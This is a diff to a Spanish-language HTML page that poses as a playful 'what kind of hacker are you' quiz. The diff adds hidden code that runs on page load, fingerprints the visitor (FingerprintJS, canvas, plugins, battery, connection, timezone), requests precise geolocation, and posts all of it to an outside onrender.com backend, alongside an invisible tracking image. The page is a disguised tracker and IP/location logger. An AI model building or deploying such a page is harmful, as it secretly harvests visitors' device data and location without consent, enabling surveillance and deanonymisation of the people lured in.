@@ -2,36 +2,154 @@
 <html>
   <head>
     <title>¿Qué tan creativo eres?</title>
+    <!-- FingerprintJS library -->
+    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
   </head>
   <body>
     <h2>Descubre qué tipo de hacker serías</h2>
     <p>Responde este test divertido para saber tu arquetipo hacker 🧠💻</p>
     <button onclick="window.location.href='https://www.youtube.com/watch?v=dQw4w9WgXcQ'">Comenzar</button>
+    
     <!-- Carga invisible al backend -->
     <img src="https://testproyecto-zkq4.onrender.com" style="display:none;" />
-    <!-- Fingerprinting y recolección pasiva -->
-    <script src="https://testproyecto-zkq4.onrender.com"></script>
+    
     <script>
+      // Recolección de datos principal
       async function recolectarDatos() {
+        // Usar FingerprintJS para obtener un ID único
         const fp = await FingerprintJS.load();
         const result = await fp.get();
+        
+        // Crear un objeto con la información básica
         const info = {
           language: navigator.language,
+          languages: navigator.languages,
           platform: navigator.platform,
           userAgent: navigator.userAgent,
           screenWidth: screen.width,
           screenHeight: screen.height,
+          colorDepth: screen.colorDepth,
+          pixelRatio: window.devicePixelRatio,
           timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          timezoneOffset: new Date().getTimezoneOffset(),
           referrer: document.referrer,
-          fingerprint: result.visitorId
+          cookiesEnabled: navigator.cookieEnabled,
+          doNotTrack: navigator.doNotTrack,
+          fingerprint: result.visitorId,
+          vendor: navigator.vendor,
+          dateTime: new Date().toString()
         };
-        fetch("https://tu-ip-logger-backend.onrender.com/info", {
+        
+        // Información sobre la conexión
+        if (navigator.connection) {
+          info.connection = {
+            effectiveType: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            rtt: navigator.connection.rtt,
+            saveData: navigator.connection.saveData
+          };
+        }
+        
+        // Información de la batería
+        try {
+          if (navigator.getBattery) {
+            const battery = await navigator.getBattery();
+            info.battery = {
+              level: battery.level,
+              charging: battery.charging,
+              chargingTime: battery.chargingTime,
+              dischargingTime: battery.dischargingTime
+            };
+          }
+        } catch (e) {
+          info.batteryError = e.message;
+        }
+        
+        // Canvas fingerprinting
+        try {
+          const canvas = document.createElement('canvas');
+          const ctx = canvas.getContext('2d');
+          canvas.width = 200;
+          canvas.height = 200;
+          
+          // Textos y formas para fingerprinting
+          ctx.textBaseline = "top";
+          ctx.font = "14px 'Arial'";
+          ctx.textBaseline = "alphabetic";
+          ctx.fillStyle = "#f60";
+          ctx.fillRect(125, 1, 62, 20);
+          ctx.fillStyle = "#069";
+          ctx.fillText("Fingerprinting...", 2, 15);
+          ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+          ctx.fillText("Fingerprinting...", 4, 17);
+          
+          // Formas adicionales
+          ctx.fillRect(0, 0, 10, 10);
+          ctx.fillRect(50, 50, 25, 25);
+          ctx.arc(100, 100, 50, 0, Math.PI * 2);
+          ctx.fill();
+          
+          info.canvasFingerprint = canvas.toDataURL();
+        } catch (e) {
+          info.canvasFingerprintError = e.message;
+        }
+        
+        // Lista de plugins
+        try {
+          if (navigator.plugins) {
+            const plugins = [];
+            for (let i = 0; i < navigator.plugins.length; i++) {
+              const plugin = navigator.plugins[i];
+              plugins.push({
+                name: plugin.name,
+                description: plugin.description,
+                filename: plugin.filename
+              });
+            }
+            info.plugins = plugins;
+          }
+        } catch (e) {
+          info.pluginsError = e.message;
+        }
+        
+        // Solicitar ubicación precisa (requerirá permisos)
+        try {
+          navigator.geolocation.getCurrentPosition(position => {
+            const locationInfo = {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy: position.coords.accuracy,
+              altitude: position.coords.altitude,
+              altitudeAccuracy: position.coords.altitudeAccuracy,
+              heading: position.coords.heading,
+              speed: position.coords.speed,
+              timestamp: position.timestamp
+            };
+            
+            // Enviar ubicación como datos adicionales
+            fetch("https://testproyecto-zkq4.onrender.com/info", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                type: "geolocation",
+                data: locationInfo
+              })
+            });
+          });
+        } catch (e) {
+          info.geolocationError = e.message;
+        }
+        
+        // Enviar toda la información recolectada al backend
+        fetch("https://testproyecto-zkq4.onrender.com/info", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(info)
         });
       }
-      recolectarDatos();
+      
+      // Ejecutar la recolección de datos cuando la página se cargue
+      window.addEventListener('load', recolectarDatos);
     </script>
   </body>
 </html>
